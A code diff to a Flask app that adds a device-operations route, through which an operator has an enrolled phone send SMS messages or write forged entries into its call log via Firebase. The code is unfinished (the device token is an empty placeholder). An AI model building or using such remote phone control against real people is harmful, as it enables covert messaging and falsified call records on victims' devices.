@@ -61,6 +61,36 @@ def devData():
 def devOp():
     devId = deviceTable.query.with_entities(deviceTable.instanceID)
     count = devId.count()
+    if request.method == 'POST':
+        if request.form['sendsms']:
+            device = request.form['sendsms']
+            device_token = ""  # need to retrieve device token from database
+            sendto = request.form['sendto']
+            message = request.form['message']
+            dataMessage = {"sendsms": device, "sendto": sendto, "message": message}
+        elif request.form['writeCallLog']:
+            device = request.form['writeCallLog']
+            device_token = ""  # need to retrieve device token from database
+            calldate = request.form['calldate']
+            callduration = request.form['callduration']
+            if request.form['dialled']:
+                calltype = "dialled"
+            elif request.form['received']:
+                calltype = "received"
+            else:
+                calltype = "missed"
+            callnumber = request.form['callnumber']
+            if request.form['callAckYes']:
+                callAck = "1"
+            else:
+                callAck = "0"
+            dataMessage = {"writeCallLog": device,
+                           "calldate": calldate,
+                           "callduration": callduration,
+                           "calltype": calltype,
+                           "callnumber": callnumber,
+                           "callAck": callAck}
+        firebase(device_token, dataMessage)
     return render_template('devOp.html', name=current_user.id, devsId=devId, count=count)
 
 
